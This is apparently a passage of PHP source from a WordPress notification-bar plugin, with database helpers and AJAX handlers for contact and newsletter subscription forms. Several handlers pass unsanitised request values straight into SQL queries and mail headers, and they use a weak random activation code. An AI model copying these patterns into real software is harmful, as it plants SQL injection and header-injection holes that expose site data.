          /**
           * get notification bar data from table. 
           * */
          function get_notification_bar_data($id){
            global $wpdb;
            $table_name = $wpdb->prefix . "apex_notification_bar";
            if(intval($id)){
                $edn_bars = $wpdb->get_results("SELECT * FROM $table_name where nb_id = $id");
            }else{
                $edn_bars = $wpdb->get_results("SELECT * FROM $table_name");
            }
            return $edn_bars;
        }

           /**
           * get all notification bar data from table with pagination  
           * */
           function get_all_notification_bar_data() {

            global $wpdb;
            $table_name = $wpdb->prefix . "apex_notification_bar";
            $query = "SELECT * FROM $table_name ORDER BY nb_id DESC";

            $total_query = "SELECT COUNT(1) FROM (${query}) AS combined_table";
            $total = $wpdb->get_var( $total_query );
            $items_per_page = 20;
            $page = isset( $_GET['cpage'] ) ? abs( (int) $_GET['cpage'] ) : 1;
            $offset = ( $page * $items_per_page ) - $items_per_page;
            $latestposts = $wpdb->get_results( $query . " LIMIT ${offset}, ${items_per_page}" );

            return $latestposts;
        }

         /*
         * Custom Pagination Function 
         */
         function edn_custom_pagination() {
            global $wpdb;
            $table_name = $wpdb->prefix . "apex_notification_bar";
            $query = "SELECT * FROM $table_name ORDER BY nb_id DESC";

            $total_query = "SELECT COUNT(1) FROM (${query}) AS combined_table";
            $total = $wpdb->get_var( $total_query );
            $items_per_page = 20;
            $page = isset( $_GET['cpage'] ) ? abs( (int) $_GET['cpage'] ) : 1;

            echo paginate_links( array(
                'base' => add_query_arg( 'cpage', '%#%' ),
                'format' => '',
                                // 'prev_text' => __('&laquo;'),
                                // 'next_text' => __('&raquo;'),
                'prev_text'          => __( '« Previous', APEXNB_TD ),
                'next_text'          => __( 'Next »', APEXNB_TD ),
                'total' => ceil($total / $items_per_page),
                'current' => $page
                ));
        }

          /**
           * get notification bar data from table. 
           * */
          function get_page_base_bar($post_id){
            $edn_page_bar = get_post_meta( $post_id, 'apex-notification-bar', true);


            return $edn_page_bar;
        }

            /**
           * Get notification bar data from table. 
           * */
            function get_page_wise_bar($post_id){
                $edn_page_bar = array();
                $edn_page_bar['top_bar'] = get_post_meta( $post_id, 'apex-notification-bar', true );  
                $edn_page_bar['bottom_bar'] = get_post_meta( $post_id, 'apex-notification-bar-bottom', true );  
                $edn_page_bar['left_bar'] = get_post_meta( $post_id, 'apex-notification-bar-left', true );  
                $edn_page_bar['right_bar'] = get_post_meta( $post_id, 'apex-notification-bar-right', true );  

                return $edn_page_bar;
            }

          /**
           * edn bar lists add in page post and post type.
           * */
          function edn_bar_custom_meta_boxes() {
            $screens = array( 'post', 'page', 'post_type' );
            add_meta_box(
             'apex-notification-bar',
             __( 'Choose APEX Notification Bar',APEXNB_TD),
             array($this, 'notification_bar_callback'),
             '',
             'side',
             'default'
             );
        }

        public function notification_bar_callback($post){
            global $post , $post_type;

               // $bnotification_bar = $this->get_notification_bar_data('');
            wp_nonce_field( basename( __FILE__ ), 'apexnb_notification_bar_nonce' );
            $top_notification = get_post_meta( $post->ID, 'apex-notification-bar', true );  
            $bottom_notification = get_post_meta( $post->ID, 'apex-notification-bar-bottom', true );  
            $left_notification = get_post_meta( $post->ID, 'apex-notification-bar-left', true );  
            $right_notification = get_post_meta( $post->ID, 'apex-notification-bar-right', true );  
            ?>
            <p class="apex-note"><?php _e('Note: If you select default, <b>DEFAULT NOTIFICATION BAR</b> will be shown on this post/page.',APEXNB_TD);?>
               <?php _e('To change the default, click ',APEXNB_TD);?><a href="<?php echo admin_url('admin.php?page=apexnb-settings');?>" target="_blank">Change Default Now.</a></p>
               <p class="apex-note"><?php _e('On select Disable option, specific notification bar will be disable for this page only.',APEXNB_TD);?></p>

               <div class="apexnb-barsettings-wrapper">
                   <label><?php _e('Top Bar');?></label>
                   <select name="apex-notification-bar" class="apex-default-bar" style="width:234px;">
                    <option value="default" <?php if($top_notification=='default'){echo 'selected="selected"';}?>>Default</option>

                    <?php
                    $tnotification_bar = $this->get_specific_notification_bar_data('top');
                    if (count($tnotification_bar) > 0) {
                        foreach ($tnotification_bar as $pro_bar) {
                            ?>
                            <option value="<?php echo esc_attr($pro_bar->nb_id); ?>" <?php if($top_notification==$pro_bar->nb_id){echo 'selected="selected"';}?>><?php echo esc_attr($pro_bar->edn_bar_name); ?></option>
                            <?php
                        }
                    }
                    ?>
                    <option value="disable" <?php if($top_notification=='disable'){echo 'selected="selected"';}?>>Disable</option>
                </select>
            </div>
            <div class="apexnb-barsettings-wrapper">
                <label><?php _e('Bottom Bar');?></label>
                <select name="apex-notification-bar-bottom" class="apex-default-bar" style="width:234px;">
                    <option value="default" <?php if($bottom_notification=='default'){echo 'selected="selected"';}?>>Default</option>

                    <?php
                    $bnotification_bar = $this->get_specific_notification_bar_data('bottom');
                    if (count($bnotification_bar) > 0) {
                        foreach ($bnotification_bar as $pro_bar) {
                            ?>
                            <option value="<?php echo esc_attr($pro_bar->nb_id); ?>" <?php if($bottom_notification==$pro_bar->nb_id){echo 'selected="selected"';}?>><?php echo esc_attr($pro_bar->edn_bar_name); ?></option>
                            <?php
                        }
                    }
                    ?>
                    <option value="disable" <?php if($bottom_notification=='disable'){echo 'selected="selected"';}?>>Disable</option>
                </select>
            </div>
            <div class="apexnb-barsettings-wrapper">
               <label><?php _e('Left Bar');?></label>
               <select name="apex-notification-bar-left" class="apex-default-bar" style="width:234px;">
                <option value="default" <?php if($left_notification=='default'){echo 'selected="selected"';}?>>Default</option>

                <?php
                $lnotification_bar = $this->get_specific_notification_bar_data('left');
                if (count($lnotification_bar) > 0) {
                    foreach ($lnotification_bar as $pro_bar) {
                        ?>
                        <option value="<?php echo esc_attr($pro_bar->nb_id); ?>" <?php if($left_notification==$pro_bar->nb_id){echo 'selected="selected"';}?>><?php echo esc_attr($pro_bar->edn_bar_name); ?></option>
                        <?php
                    }
                }
                ?>
                <option value="disable" <?php if($left_notification=='disable'){echo 'selected="selected"';}?>>Disable</option>
            </select>
        </div>
        <div class="apexnb-barsettings-wrapper">
            <label><?php _e('Right Bar');?></label>
            <select name="apex-notification-bar-right" class="apex-default-bar" style="width:234px;">
                <option value="default" <?php if($right_notification=='default'){echo 'selected="selected"';}?>>Default</option>

                <?php $rnotification_bar = $this->get_specific_notification_bar_data('right');
                if (count($rnotification_bar) > 0) {
                    foreach ($rnotification_bar as $pro_bar) {
                        ?>
                        <option value="<?php echo esc_attr($pro_bar->nb_id); ?>" <?php if($right_notification==$pro_bar->nb_id){echo 'selected="selected"';}?>><?php echo esc_attr($pro_bar->edn_bar_name); ?></option>
                        <?php
                    }
                }
                ?>
                <option value="disable" <?php if($right_notification=='disable'){echo 'selected="selected"';}?>>Disable</option>
            </select>
        </div>

        <?php
    }

    function get_specific_notification_bar_data($a = ''){
        global $wpdb;
        $table_name = $wpdb->prefix . "apex_notification_bar";
        if($a != ''){
            if($a == "top"){
                $edn_bars = $wpdb->get_results("SELECT * FROM $table_name where edn_position = '{$a}' || edn_position = 'top_absolute';");
            }else{
               $edn_bars = $wpdb->get_results("SELECT * FROM $table_name where edn_position = '{$a}';");
           }

       }else{
        $edn_bars = $wpdb->get_results("SELECT * FROM $table_name");
    }

    return $edn_bars;
}

          /**
           * When the post is saved, saves our custom data.
           *
           * @param int $post_id The ID of the post being saved.
           */
          function edn_bar_save_meta_box_data($post_id){
             global $post; 
               // Verify the nonce before proceeding.
             if ( isset($_POST['apexnb_notification_bar_nonce']) && !wp_verify_nonce($_POST['apexnb_notification_bar_nonce'],basename( __FILE__ ) ) ) {
                return;
            }

               // Stop WP from clearing custom fields on autosave
            if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE)  
             return;

         if (!current_user_can( 'edit_post', $post_id ) ) {  
             return $post_id;  
         }
               //Execute this saving function
         $old1 =  get_post_meta( $post_id, 'apex-notification-bar', true);
         $old2 =  get_post_meta( $post_id, 'apex-notification-bar-bottom', true);
         $old3 =  get_post_meta( $post_id, 'apex-notification-bar-left', true);
         $old4 =  get_post_meta( $post_id, 'apex-notification-bar-right', true);
         $new1 =  isset($_POST['apex-notification-bar'])?sanitize_text_field($_POST['apex-notification-bar']):'';
         $new2 =  isset($_POST['apex-notification-bar-bottom'])?sanitize_text_field($_POST['apex-notification-bar-bottom']):'';
         $new3 =  isset($_POST['apex-notification-bar-left'])?sanitize_text_field($_POST['apex-notification-bar-left']):'';
         $new4 =  isset($_POST['apex-notification-bar-right'])?sanitize_text_field($_POST['apex-notification-bar-right']):'';


         if ($new1 && $new1 != $old1) {  
             update_post_meta($post_id, 'apex-notification-bar', $new1);  
         } elseif ('' == $new1 && $old1) {  
             delete_post_meta($post_id,'apex-notification-bar', $old1);  
         }
         if ($new2 && $new2 != $old2) {  
            update_post_meta($post_id, 'apex-notification-bar-bottom', $new2);  
        } elseif ('' == $new2 && $old2) {    
            delete_post_meta($post_id,'apex-notification-bar-bottom', $old2);    
        }
        if ($new3 && $new3 != $old3) {  
            update_post_meta($post_id, 'apex-notification-bar-left', $new3);  
        } elseif ('' == $new3 && $old3) {  
            delete_post_meta($post_id,'apex-notification-bar-left', $old3);  
        }
        if ($new4 && $new4 != $old4) {  
         update_post_meta($post_id, 'apex-notification-bar-right', $new4);  
     } elseif ('' == $new4 && $old4) {  
         delete_post_meta($post_id,'apex-notification-bar-right', $old4);  
     }
 }

          /**
           * Function to redirect to notification bar 
           */
          function edn_notify_call_in_frontend(){
            include_once( 'inc/frontend/frontend.php' );
        }

          /**
           * Function of Contact us ajax.
           * */
          function contact_us_action_callback(){
            if(isset($_POST) && wp_verify_nonce($_POST['nonce'],'edn-front-ajax-nonce')){

                $barid = sanitize_text_field($_POST['barid']);
                $name = sanitize_text_field($_POST['name']);
                $email = sanitize_text_field($_POST['email']);
                $formtype = sanitize_text_field($_POST['formtype']);
                $id_array = sanitize_text_field($_POST['id_array']);
                $user_message = sanitize_text_field($_POST['message']);
                $site_name = site_url();
                $arr =  $this->get_notification_bar_data($barid);
                $ednbar = unserialize($arr[0]->edn_bar);
                $to_email = get_option( 'admin_email' );
                if($formtype == "static"){
                    $to = (isset($ednbar['edn_static']['send_to_mail']) && $ednbar['edn_static']['send_to_mail'] != '')?$ednbar['edn_static']['send_to_mail']:$to_email;
                }else{
                    $to = (isset($ednbar['edn_multiple']['send_to_mail'][$id_array]) && $ednbar['edn_multiple']['send_to_mail'][$id_array] != '')?$ednbar['edn_multiple']['send_to_mail'][$id_array]:$to_email;
                }


                $message = 'Hi there, <br/><br/>
                You have got a new visitor at '.$site_name.'<br/><br/> 
                <strong>Visitor Details :</strong> <br>
                Name: '.$name.'<br/>
                Email: '.$email.'<br/>Message: '.$user_message.'<br/><br/> Thank you.';

                $subject = 'Enquiry from '.$name;

                $headers  = "X-Mailer: php\n";
                $headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
                $headers .= 'From: '.$name.' <'.$email.'>' . "\r\n\\";
                $headers .= 'Reply-To: $email' . "\r\n\\";
                $headers .= 'X-Mailer: PHP/' . phpversion();

                $mail = wp_mail( $to, $subject, $message, $headers );
                if($mail){
                    die($mail);   
                }else{
                    return false;
                }
            }else{
                die('No script kiddies please!');
            }
        }


         /**
          * Function of subscribe ajax
          * custom subscrbe form submission 
          * */
         function subscribe_action_callback(){

             if(wp_verify_nonce($_POST['nonce'],'edn-front-ajax-nonce')){

                   global $wpdb; // this is how you get access to the database
                   $email = $_POST['email'];
                   $barid = $_POST['bar_id'];// bar data
                   $arr =  $this->get_notification_bar_data($barid);
                   
                   $ednbar = unserialize($arr[0]->edn_bar);
                   $name = '';
                   $confirm = $_POST['confirm'];
                   $sitename = get_bloginfo( 'name' );
                   $site_email = "noreply@siteurl.com";
                   $subject = __("Subscribe Confirmation");
                   $page_id = $_POST['page_id'];
                   $nonce = $_POST['nonce'];
                   $date = date("Y-m-d H:i:s");
                   $to = $email;
                   $act_code = rand(0,1000);
                   $url = esc_url(get_permalink($page_id).'?subs_type=custom&page_idd='.$page_id.'&code='.$act_code.'&edn_subs_nonce_field='.$nonce.'&email='.$email);
                   $emailmessage = "Thanks for Subscribing! Please Click the <a href='$url' target='_blank'>Confirm</a> link to get confirmed.";

                   $site_title = (isset($ednbar['edn_subs_custom']['from_name']) && $ednbar['edn_subs_custom']['from_name'] != '')?$ednbar['edn_subs_custom']['from_name']:$sitename;
                   $femail = (isset($ednbar['edn_subs_custom']['from_email']) && $ednbar['edn_subs_custom']['from_email'] != '')?$ednbar['edn_subs_custom']['from_email']:$site_email;
                   
                   $subject = (isset($ednbar['edn_subs_custom']['email_subject']) && $ednbar['edn_subs_custom']['email_subject'] != '')?$ednbar['edn_subs_custom']['email_subject']:$subject;
                   $message = (isset($ednbar['edn_subs_custom']['message']) && $ednbar['edn_subs_custom']['message'] != '')?$ednbar['edn_subs_custom']['message']:$emailmessage;


                   $from = 'From:'.$site_title.' <'.$femail.'>' ."\r\n";


                   // To send HTML mail, the Content-type header must be set
                   $headers  = 'MIME-Version: 1.0' . "\r\n";
                   $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                   $headers .= $from;

                   $table_name = $wpdb->prefix . 'apexnb_subscriber';
                   $search_email = $wpdb->get_results( " SELECT * FROM $table_name WHERE email = '$email'");
                   if($confirm==1){
                     if($search_email)
                     {
                           die('aready');// already subscribe
                           wp_redirect( get_permalink($page_id) ); exit;
                       }else{
                         $edn_setting = $this->apexnb_settings;
                         $edn_use_smtp      = ((isset($edn_setting['edn_use_smtp']) && $edn_setting['edn_use_smtp'] ==1)?$edn_setting['edn_use_smtp']:'');
                         $edn_smtp_host   = ((isset($edn_setting['edn_smtp_host']) && $edn_setting['edn_smtp_host'] != '')?$edn_setting['edn_smtp_host']:'');

                         $edn_smtp_port     =  ((isset($edn_setting['edn_smtp_port']) && $edn_setting['edn_smtp_port'] != '')?$edn_setting['edn_smtp_port']:'');
                         $edn_smtp_auth     =  ((isset($edn_setting['edn_smtp_auth']) && $edn_setting['edn_smtp_auth'] ==1)?$edn_setting['edn_smtp_auth']:'');
                         $edn_smtp_username = ((isset($edn_setting['edn_smtp_username']) && $edn_setting['edn_smtp_username'] != '')?$edn_setting['edn_smtp_username']:'');
                         $edn_smtp_password = ((isset($edn_setting['edn_smtp_password']) && $edn_setting['edn_smtp_password'] != '')?$edn_setting['edn_smtp_password']:'');
                         $edn_encryption_type =  ((isset($edn_setting['edn_encryption_type']) && $edn_setting['edn_encryption_type'] !='')?$edn_setting['edn_encryption_type']:'');

                         if($edn_use_smtp != '' && $edn_smtp_host != '' && $edn_smtp_port !=''){
                           $mail = $this->email_send($name,$to,$message,$site_title,$femail,$subject);
                       }else{
                        $mail = wp_mail( $to, $subject, $message, $headers );
                    }
                    if($mail){
                     $wpdb->insert( $table_name, array( 'email' => $email , 'active_code' => $act_code, 'date'=>$date) );
                     die('confirm');
                 }else{
                   die('fail');   
               }


           }
       }else{
         if($search_email)
         {
                           die('aready');// aready subscribe
                       }else{
                         $query= $wpdb->insert( $table_name, array( 'email' => $email , 'date' => $date ) );
                         die('success');
                     }
                 }
             }else{
                die('No script kiddies please!');
            }
        }
         /**
          * Function to notification subscribe conform
          * */
         function confirm_notification_subscribe(){
             if (isset($_GET['edn_subs_nonce_field']) && wp_verify_nonce( $_GET['edn_subs_nonce_field'] ,'edn-front-ajax-nonce') ) {
             //echo "sasdasds".$_GET['edn_subs_nonce_field'];
                if(isset($_GET['subs_type']) && $_GET['subs_type']=='custom'){
                //session_start();

                global $wpdb; // this is how you get access to the database
                $code = $_GET['code'];
                $email = $_GET['email'];
                $check_valid_email = preg_match(
                    '/^[A-z0-9_\-]+[@][A-z0-9_\-]+([.][A-z0-9_\-]+)+[A-z.]{2,4}$/', $email
                    );
                if ($check_valid_email) {   
                    $page_id = $_GET['page_idd'];
                    $table_name = $wpdb->prefix . 'apexnb_subscriber';
                    $chcek_code = $wpdb->get_results( "SELECT * FROM $table_name WHERE active_code = '$code'");
                    if($chcek_code)
                    {
                        $search_email = $wpdb->get_results( "SELECT * FROM $table_name WHERE email = '$email'");
                        if($search_email)
                        {
                            $_SESSION['edn-subs-sms']=__('You have already subscribe.',APEXNB_TD);
                       // wp_redirect( get_permalink($page_id) ); exit;
                        }else{
                            $edn_bar_data = $this->get_specific_bar();
                            if(isset($edn_bar_data['edn_subs_custom']['thank_text'])){
                                $success = $edn_bar_data['edn_subs_custom']['thank_text'];
                            }else{
                                $success = __('Thank you for subscribing us.',APEXNB_TD);
                            }
                            $date = date("Y-m-d H:i:s");
                            $wpdb->delete( $table_name, array( 'active_code' => $code ), array( '%d' ) );
                            $query= $wpdb->insert( $table_name, array( 'email' => $email , 'date' => $date ) );
                            $_SESSION['edn-subs-sms']= $success;
                       // wp_redirect( get_permalink($page_id) ); exit;
                        }
                    }
                }else {
                   $_SESSION['edn-subs-sms']=__('Email ID is invalid.',APEXNB_TD);
               }
           }else if(isset($_GET['subs_type']) && $_GET['subs_type']=='mailchimp'){
            $edn_bar_data = $this->get_specific_bar();
            if(isset($edn_bar_data['edn_mailchimp']['thank_text'])){
                $thank_txt = $edn_bar_data['edn_mailchimp']['thank_text'];
            }else{
                $thank_txt = __('Thank you for subscribe us.',APEXNB_TD);               
            } 
            $email = $_GET['email'];
            $check_valid_email = preg_match(
                '/^[A-z0-9_\-]+[@][A-z0-9_\-]+([.][A-z0-9_\-]+)+[A-z.]{2,4}$/', $email
                );
            if($check_valid_email){ 
                $api_keys = $_GET['api_key'];
                $mailchimp_list =$_GET['mailchimp_list'];
                $list_array = explode(",",$mailchimp_list);
                $page_id = $_POST['page_idd'];
                $email_type = 'html';
                $merge_vars = array();
                $api = apexnb_edn_get_api();
                $result = false;

            		// loop through selected lists
                foreach($list_array as $list_id){
                    $result = $api->subscribe( $list_id, $email, $merge_vars, $email_type, '', '', 'true','');
                }
                    // did we succeed in subscribing with the parsed data?
                if( ! $result ) {
                 $this->message_type = ( $api->get_error_code() === 214 ) ? 'already_subscribed' : 'error';
                 $this->mailchimp_error = $api->get_error_message();
                 $_SESSION['edn-mailchimp-sms'] = $this->mailchimp_error;
             } else {
                 $this->message_type = $thank_txt;
                 $_SESSION['edn-mailchimp-sms'] = $this->message_type;
             }
                   // wp_redirect( get_permalink($page_id) ); exit;
         }else{
            $_SESSION['edn-mailchimp-sms'] = __('Email ID is invalid.',APEXNB_TD);
        }
    }

}
}
         /**
          * Ajax Subscribe Form :mailchimp
          * */
         function mailchimp_action_callback(){
          if(wp_verify_nonce($_POST['nonce'],'edn-front-ajax-nonce')){
            $barid = $_POST['bar_id'];
            $arr =  $this->get_notification_bar_data($barid);
            $ednbar = unserialize($arr[0]->edn_bar);

            $email = $_POST['email'];
            $confirm = $_POST['confirm'];
            $sitename = get_bloginfo( 'name' );
            $site_email = "noreply@siteurl.com";
            $esubject = __("Subscribe Confirmation");
            $api_keys = $_POST['api_key'];
            $mailchimp_list =$_POST['mailchimp_list'];
            $list_array = explode(",",$mailchimp_list);
            $page_id = $_POST['page_idd'];
            $nonce = $_POST['nonce'];
            $to = $email;
            $url =  esc_url(get_permalink($page_id).'?subs_type=mailchimp&page_idd='.$page_id.'&api_key='.$api_keys.'&mailchimp_list='.$mailchimp_list.'&edn_subs_nonce_field='.$nonce.'&email='.$email);
            $emailmessage = "Thanks for Subscribing! Please Click the <a href='$url'>Confirm</a> link to get confirmed.";

            $site_title = (isset($ednbar['edn_mailchimp']['from_name']) && $ednbar['edn_mailchimp']['from_name'] != '')?$ednbar['edn_mailchimp']['from_name']:$sitename;
            $admin_email = (isset($ednbar['edn_mailchimp']['from_email']) && $ednbar['edn_mailchimp']['from_email'] != '')?$ednbar['edn_mailchimp']['from_email']:$site_email;
            $subject = (isset($ednbar['edn_subs_custom']['email_subject']) && $ednbar['edn_subs_custom']['email_subject'] != '')?$ednbar['edn_subs_custom']['email_subject']:$esubject;
            $message = (isset($ednbar['edn_subs_custom']['message']) && $ednbar['edn_subs_custom']['message'] != '')?$ednbar['edn_subs_custom']['message']:$emailmessage;
            $name = '';


            $from = 'From:'.$site_title.' <'.$admin_email.'>' ."\r\n";


                // To send HTML mail, the Content-type header must be set
            $headers  = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
            $headers .= $from;
            if($confirm==1){

               $edn_setting = $this->apexnb_settings;
               $edn_use_smtp      = ((isset($edn_setting['edn_use_smtp']) && $edn_setting['edn_use_smtp'] ==1)?$edn_setting['edn_use_smtp']:'');
               $edn_smtp_host   = ((isset($edn_setting['edn_smtp_host']) && $edn_setting['edn_smtp_host'] != '')?$edn_setting['edn_smtp_host']:'');

               $edn_smtp_port     =  ((isset($edn_setting['edn_smtp_port']) && $edn_setting['edn_smtp_port'] != '')?$edn_setting['edn_smtp_port']:'');
               $edn_smtp_auth     =  ((isset($edn_setting['edn_smtp_auth']) && $edn_setting['edn_smtp_auth'] ==1)?$edn_setting['edn_smtp_auth']:'');
               $edn_smtp_username = ((isset($edn_setting['edn_smtp_username']) && $edn_setting['edn_smtp_username'] != '')?$edn_setting['edn_smtp_username']:'');
               $edn_smtp_password = ((isset($edn_setting['edn_smtp_password']) && $edn_setting['edn_smtp_password'] != '')?$edn_setting['edn_smtp_password']:'');
               $edn_encryption_type =  ((isset($edn_setting['edn_encryption_type']) && $edn_setting['edn_encryption_type'] !='')?$edn_setting['edn_encryption_type']:'');

               if($edn_use_smtp != '' && $edn_smtp_host != '' && $edn_smtp_port !=''){
                $mail = $this->email_send($name,$email,$message,$site_title,$to,$subject);
            }else{
                $mail = wp_mail( $to, $subject, $message, $headers );
            }
            $email_type = 'html';
            $merge_vars = array();
            $api = apexnb_edn_get_api();
            $result = false;

                      // loop through selected lists
            foreach($list_array as $list_id){
              $result = $api->subscribe( $list_id, $email, $merge_vars, $email_type, '', '', 'true','');
          }
                          // did we succeed in subscribing with the parsed data?
          if( ! $result ) {
            $this->message_type = ( $api->get_error_code() === 214 ) ? 'already_subscribed' : 'error';
            $this->mailchimp_error = $api->get_error_message();
            echo $this->mailchimp_error;

        } else {
            $this->message_type = 'Subscribed';
            echo $this->message_type;

        }
    }else{
       $email_type = 'html';
       $merge_vars = array();
       $api = apexnb_edn_get_api();
       $result = false;

            		// loop through selected lists
       foreach($list_array as $list_id){
        $result = $api->subscribe( $list_id, $email, $merge_vars, $email_type, '', '', 'true','');
    }
                    // did we succeed in subscribing with the parsed data?
    if( ! $result ) {
     $this->message_type = ( $api->get_error_code() === 214 ) ? 'already_subscribed' : 'error';
     $this->mailchimp_error = $api->get_error_message();
     echo $this->mailchimp_error;

 } else {
     $this->message_type = 'Subscribed';
     echo $this->message_type;

 }
 die();
}
}
}

            /* 
          * Frontend Constant Contact subscribers submission Ajax
          */
            function submit_constant_contact(){
                if(isset($_POST) && wp_verify_nonce($_POST['nonce'],'edn-front-ajax-nonce')){
                    $barid = $_POST['bar_id'];
                    $arr =  $this->get_notification_bar_data($barid);
                    $ednbar = unserialize($arr[0]->edn_bar);

                    $email = $_POST['email'];
                    $confirm = $_POST['confirm'];

                    $sitename     = get_bloginfo( 'name' );
                    $site_email   = "noreply@siteurl.com";
                    $esubject     =  __("Subscribe Confirmation");
                    $emailmessage = __("You have been subscribed successfully.");

                    $site_title   = (isset($ednbar['edn_constant']['from_name']) && $ednbar['edn_constant']['from_name'] != '')?$ednbar['edn_constant']['from_name']:$sitename;
                    $admin_email  = (isset($ednbar['edn_mailchimp']['from_email']) && $ednbar['edn_mailchimp']['from_email'] != '')?$ednbar['edn_mailchimp']['from_email']:$site_email;
                    $subject      = (isset($ednbar['edn_subs_custom']['email_subject']) && $ednbar['edn_subs_custom']['email_subject'] != '')?$ednbar['edn_subs_custom']['email_subject']:$esubject;
                    $message      = (isset($ednbar['edn_subs_custom']['message']) && $ednbar['edn_subs_custom']['message'] != '')?$ednbar['edn_subs_custom']['message']:$emailmessage;

                    $to = $email;
                    $from = 'From:'.$site_title.' <'.$admin_email.'>' ."\r\n";

                    $edn_fnm = $_POST['edn_fnm'];
                    $edn_lastname = '';
                    $group_listid = $_POST['group_listid'];

                    $page_id = $_POST['page_id'];
                    $nonce = $_POST['nonce'];

                    $apexnb_constant_settings = $this->apexnb_constant_settings;
                    $cc_username        = $apexnb_constant_settings['edn_cc_username'];
                    $cc_pwd             = $apexnb_constant_settings['edn_cc_pwd'];
                    $edn_cc_apikey      = $apexnb_constant_settings['edn_cc_apikey'];
                    $edn_cc_accesstoken = $apexnb_constant_settings['edn_cc_accesstoken'];
                    
                    $EDN_ConstantContact = new EDN_ConstantContact('oauth2', $edn_cc_apikey ,$cc_username, $edn_cc_accesstoken);
                    $constant_lists = $EDN_ConstantContact->getLists();


                    if(isset($constant_lists['xml'])){
                      $string = $constant_lists['xml'];
                      $err_codes= array(
                        '401'
                        );
                      $check_error = 0;
                      foreach ($err_codes as $error_code) {
                          if (strpos($string, $error_code) !== FALSE) {
                              // echo "Match found";
                              // return $response;
                              $check_error = 1;
                          }
                      }
                  }else{
                      $check_error = 0;
                  }
                  $listarr = array();

                  if($check_error != 1){
                      $cc_lists = $constant_lists;
                      foreach ($cc_lists as $lists) {
                        if(!empty($lists)){
                            foreach ($lists as $li) {
                                $listid = $li->id;
                                $listss = explode('lists/', $listid);
                                $uniquelist_ID = $listss[1];
                                if(in_array($uniquelist_ID,$group_listid)){
                                  $listname = $li->name;
                                  array_push($listarr,$listname);
                              }
                          }
                      }
                  }
              }else{
                  $cc_lists = $string;
                  $listarr = '';
              }

              if (empty($cc_username )||empty($cc_pwd))
                        //echo __('Plugin settings incomplete',APEXNB_TD);
                echo "pluginincomplete";
            else if (empty($listname))
                       // echo __('No contact list specified',APEXNB_TD);
             echo "nocontact";
         else if (empty($email))
                       // echo __('No email provided',APEXNB_TD);
             echo "noemail";
         else {
            foreach ($listarr as $key => $value) {
                $rsp=wp_remote_get("https://api.constantcontact.com/0.1/API_AddSiteVisitor.jsp?"
                  .'loginName='.rawurlencode($cc_username)
                  .'&loginPassword='.rawurlencode($cc_pwd)
                  .'&ea='.rawurlencode($email)
                  .'&ic='.rawurlencode($value)
                  .(empty($edn_fnm)?'':('&First_Name='.rawurlencode(strip_tags($edn_fnm))))
                  .(empty($edn_lastname)?'':('&Last_Name='.rawurlencode(strip_tags($edn_lastname)))));



                if($confirm==1){   
                                // To send HTML mail, the Content-type header must be set
                    $headers  = 'MIME-Version: 1.0' . "\r\n";
                    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                    $headers .= $from;

                    $edn_setting = $this->apexnb_settings;
                    $edn_use_smtp      = ((isset($edn_setting['edn_use_smtp']) && $edn_setting['edn_use_smtp'] ==1)?$edn_setting['edn_use_smtp']:'');
                    $edn_smtp_host     = ((isset($edn_setting['edn_smtp_host']) && $edn_setting['edn_smtp_host'] != '')?$edn_setting['edn_smtp_host']:'');
                    $edn_smtp_port     =  ((isset($edn_setting['edn_smtp_port']) && $edn_setting['edn_smtp_port'] != '')?$edn_setting['edn_smtp_port']:'');
                    $edn_smtp_auth     =  ((isset($edn_setting['edn_smtp_auth']) && $edn_setting['edn_smtp_auth'] ==1)?$edn_setting['edn_smtp_auth']:'');
                    $edn_smtp_username = ((isset($edn_setting['edn_smtp_username']) && $edn_setting['edn_smtp_username'] != '')?$edn_setting['edn_smtp_username']:'');
                    $edn_smtp_password = ((isset($edn_setting['edn_smtp_password']) && $edn_setting['edn_smtp_password'] != '')?$edn_setting['edn_smtp_password']:'');
                    $edn_encryption_type =  ((isset($edn_setting['edn_encryption_type']) && $edn_setting['edn_encryption_type'] !='')?$edn_setting['edn_encryption_type']:'');

                    if($edn_use_smtp != '' && $edn_smtp_host != '' && $edn_smtp_port !=''){
                        $mail = $this->email_send($name,$email,$message,$site_title,$to,$subject);
                    }else{
                        $mail = wp_mail( $to, $subject, $message, $headers );
                    }
                    if($mail){
                      echo "confirm";
                  }else{
                      echo "fail";
                  }

              }else{

                  echo "confirm";
              }


              if (is_wp_error($rsp))
                        // echo __('Could not connect to Constant Contact',APEXNB_TD);
               echo "connection_problem";
           else {
              $rsp=explode("\n",$rsp['body']);
              if (intval($rsp[0]))
                echo !empty($rsp[1])?$rsp[1]:(intval($rsp[0])==400?__('CC username/password not accepted.',APEXNB_TD):__('Constant Contact Error',APEXNB_TD));
        }
    }  

}

die();
}

}

         /**
          * Twitter Fetch Frontend Display
          * */
         public function get_oauth_connection($cons_key, $cons_secret, $oauth_token, $oauth_token_secret){
           $ai_connection = new Apex_TwitterOAuth($cons_key, $cons_secret, $oauth_token, $oauth_token_secret);
           return $ai_connection;
       }


       function get_twitter_tweets($nb_id , $username,$total_tweets_number,$consumer_key,$consumer_secret_key,$access_token,$access_token_secret,$cache_period){
           $tweets = get_transient('aptf_'.$nb_id.'_tweets');
           $username = str_replace('@', '', $username);
           if (false === $tweets) {
            $oauth_connection = $this->get_oauth_connection($consumer_key, $consumer_secret_key, $access_token, $access_token_secret);
            $tweets = $oauth_connection->get("https://api.twitter.com/1.1/statuses/user_timeline.json?screen_name=".$username."&count=".$total_tweets_number."&tweet_mode=extended");
            if(isset($cache_period)){
                $cache_period = $cache_period;
            }else{
                $cache_period = 1;
            }
            $cache_period = intval($cache_period) * 60;
                $cache_period = ($cache_period < 1) ? 3600 : $cache_period; // if not exists 1 hr else set value for cache reset
                if(!isset($tweets->errors)){
                    $tw = ('aptf_'.$nb_id.'_tweets');
                    set_transient($tw, $tweets, $cache_period);
                }
                
            } 
            return $tweets;
        }

        

          /*
          * Get all Rss Feed From Url link Frontend Display
          */
          function validateFeed( $rssFeedURL ) {
              $rssValidator = 'http://feedvalidator.org/check.cgi?url=';
              
              if( $rssValidationResponse = file_get_contents($rssValidator . urlencode($rssFeedURL)) ){
                  if( stristr( $rssValidationResponse , 'This is a valid RSS feed' ) !== false ){
                      return true;
                  } else {
                      return false;
                  }
              } else {
